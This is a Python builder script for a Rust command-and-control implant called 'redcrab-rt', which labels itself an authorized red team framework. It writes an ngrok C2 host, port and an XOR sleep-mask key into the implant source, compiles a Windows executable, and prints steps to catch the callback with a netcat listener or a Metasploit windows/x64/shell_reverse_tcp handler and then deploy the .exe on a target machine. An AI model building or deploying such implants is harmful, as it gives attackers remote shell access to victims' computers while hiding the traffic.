#!/usr/bin/env python3
"""
redcrab-rt builder
==================
Patches C2 connection details into the Rust source, then compiles the implant.

Usage:
  python builder.py

You will be prompted for:
  ngrok_host  — the public TCP host ngrok gave you   (e.g. 0.tcp.ngrok.io)
  ngrok_port  — the public TCP port ngrok gave you   (e.g. 12345)
  lport       — your LOCAL listener port             (e.g. 4444)
  sleep_key   — 16 hex bytes for XOR / sleep mask    (leave blank = random)

The script:
  1. Patches src/c2.rs and src/main.rs with your values
  2. Runs cargo build --release
  3. Prints the path to the compiled .exe
"""

import os
import re
import sys
import random
import subprocess
from pathlib import Path

SRC_DIR   = Path(__file__).parent / "src"
C2_RS     = SRC_DIR / "c2.rs"
MAIN_RS   = SRC_DIR / "main.rs"
TARGET    = Path(__file__).parent / "target" / "x86_64-pc-windows-msvc" / "release" / "redcrab-rt.exe"

def banner():
    print()
    print("  ██████╗ ███████╗██████╗  ██████╗██████╗  █████╗ ██████╗     ██████╗ ████████╗")
    print(" ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗╚══██╔══╝")
    print(" ██████╔╝█████╗  ██║  ██║██║     ██████╔╝███████║██████╔╝    ██████╔╝   ██║   ")
    print(" ██╔══██╗██╔══╝  ██║  ██║██║     ██╔══██╗██╔══██║██╔══██╗    ██╔══██╗   ██║   ")
    print(" ██║  ██║███████╗██████╔╝╚██████╗██║  ██║██║  ██║██████╔╝    ██║  ██║   ██║   ")
    print(" ╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝   ╚═╝   ")
    print("                        authorized red team framework")
    print()

def prompt(msg, default=None):
    if default:
        val = input(f"  {msg} [{default}]: ").strip()
        return val if val else default
    val = input(f"  {msg}: ").strip()
    return val

def random_sleep_key():
    return bytes(random.randint(0, 255) for _ in range(16))

def sleep_key_from_input(s):
    """Accept comma-sep hex bytes or blank (= random)."""
    if not s:
        return random_sleep_key()
    parts = [p.strip() for p in s.replace('0x','').split(',')]
    try:
        b = bytes(int(p, 16) for p in parts if p)
        if len(b) != 16:
            raise ValueError
        return b
    except ValueError:
        print("  [!] Invalid key format — generating random key")
        return random_sleep_key()

def patch_c2_rs(host, port, key_bytes):
    text = C2_RS.read_text()
    # Patch host
    text = re.sub(
        r'pub const C2_HOST: &str = ".*?";',
        f'pub const C2_HOST: &str = "{host}";',
        text
    )
    # Patch port
    text = re.sub(
        r'pub const C2_PORT: u16\s+=\s+\d+;',
        f'pub const C2_PORT: u16   = {port};',
        text
    )
    # Patch XOR key (as a byte-literal string from the hex bytes)
    key_literal = ''.join(f'\\x{b:02x}' for b in key_bytes)
    text = re.sub(
        r'const XOR_KEY: &\[u8\] = b".*?";',
        f'const XOR_KEY: &[u8] = b"{key_literal}";',
        text
    )
    C2_RS.write_text(text)
    print(f"  [+] c2.rs patched  →  {host}:{port}")

def patch_main_rs(key_bytes):
    text = MAIN_RS.read_text()
    key_array = ', '.join(f'0x{b:02x}' for b in key_bytes)
    text = re.sub(
        r'const SLEEP_KEY: \[u8; 16\] = \[[^\]]*\];',
        f'const SLEEP_KEY: [u8; 16] = [{key_array}];',
        text,
        flags=re.DOTALL
    )
    MAIN_RS.write_text(text)
    print(f"  [+] main.rs SLEEP_KEY patched")

def compile_implant():
    print("  [*] Running cargo build --release ...")
    result = subprocess.run(
        ["cargo", "build", "--release", "--target", "x86_64-pc-windows-msvc"],
        cwd=Path(__file__).parent,
        capture_output=False
    )
    if result.returncode != 0:
        print("  [!] Build failed — check cargo output above")
        sys.exit(1)
    print(f"  [+] Build succeeded!")
    if TARGET.exists():
        size_kb = TARGET.stat().st_size // 1024
        print(f"  [+] Output: {TARGET}  ({size_kb} KB)")
    else:
        print(f"  [?] Binary not found at expected path — check target/ directory")

def ngrok_instructions(lport):
    print()
    print("  ─── ngrok setup ─────────────────────────────────────────────")
    print(f"  1. Start your listener:  nc -lvnp {lport}")
    print(f"     (or: msfconsole -x 'use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp;")
    print(f"      set LHOST 0.0.0.0; set LPORT {lport}; run')")
    print(f"  2. Start ngrok tunnel:   ngrok tcp {lport}")
    print(f"  3. Copy the public address from ngrok output:")
    print(f"     e.g.  tcp://0.tcp.ngrok.io:XXXXX")
    print(f"  4. Re-run builder.py and enter those values")
    print(f"  5. Deploy the compiled .exe on the target machine")
    print("  ──────────────────────────────────────────────────────────────")
    print()

def main():
    banner()
    print("  === redcrab-rt implant builder ===")
    print()

    ngrok_host = prompt("ngrok host (e.g. 0.tcp.ngrok.io)")
    ngrok_port = int(prompt("ngrok port (e.g. 12345)"))
    lport      = int(prompt("local listener port (e.g. 4444)", default="4444"))
    key_input  = prompt("SLEEP_KEY 16 hex bytes comma-sep (blank = random)")
    key_bytes  = sleep_key_from_input(key_input)

    print()
    print(f"  [*] SLEEP_KEY = {' '.join(f'{b:02x}' for b in key_bytes)}")
    print()

    patch_c2_rs(ngrok_host, ngrok_port, key_bytes)
    patch_main_rs(key_bytes)
    compile_implant()
    ngrok_instructions(lport)

if __name__ == "__main__":
    main()
